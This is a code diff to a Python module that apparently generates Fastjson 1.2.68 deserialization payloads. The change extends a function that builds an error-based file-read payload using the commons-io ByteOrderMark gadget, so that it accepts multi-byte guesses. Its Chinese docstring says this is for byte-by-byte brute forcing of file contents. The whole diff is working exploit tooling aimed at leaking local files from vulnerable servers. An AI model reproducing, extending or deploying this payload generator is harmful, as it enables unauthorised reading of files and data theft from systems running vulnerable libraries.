@@ -286,8 +286,22 @@ def build_io_final(file: str, content: str = "FJ1268_IOFINAL") -> str:
     return build_io3_write(file, content)
 
 
-def build_io_read_error(url: str = "file:///tmp/fj1268_copy_src", guess_byte: int = 70) -> str:
-    """报错读：猜对首字节时报错（charSequence 异常）。"""
+def build_io_read_error(
+    url: str = "file:///tmp/fj1268_copy_src",
+    guess_byte: int = 70,
+    bom_bytes: Optional[list[int]] = None,
+) -> str:
+    """报错读：BOM bytes 与文件前缀一致时报错（可多字节，供逐字节爆破）。
+
+    ``bom_bytes`` 优先；未传时用单个 ``guess_byte``（默认 70='F'）。
+    """
+    if bom_bytes is not None:
+        if not bom_bytes:
+            raise ValueError("bom_bytes 不能为空")
+        bytes_list = [int(b) & 0xFF for b in bom_bytes]
+    else:
+        bytes_list = [int(guess_byte) & 0xFF]
+    bom = ",".join(str(b) for b in bytes_list)
     u = _jesc(url)
     return (
         "{"
@@ -306,7 +320,7 @@ def build_io_read_error(url: str = "file:///tmp/fj1268_copy_src", guess_byte: in
         '"boms":[{'
         '"@type":"org.apache.commons.io.ByteOrderMark",'
         '"charsetName":"UTF-8",'
-        f'"bytes":[{int(guess_byte)}]'
+        f'"bytes":[{bom}]'
         "}]"
         "},"
         '"address":{'
@@ -488,6 +502,7 @@ def build_payload(
         return build_io_read_error(
             url or "file:///tmp/fj1268_copy_src",
             70 if guess_byte is None else guess_byte,
+            bom_bytes=bom_bytes,
         )
     if gid == "io_read_echo":
         return build_io_read_echo(url or "file:///tmp/", bom_bytes)
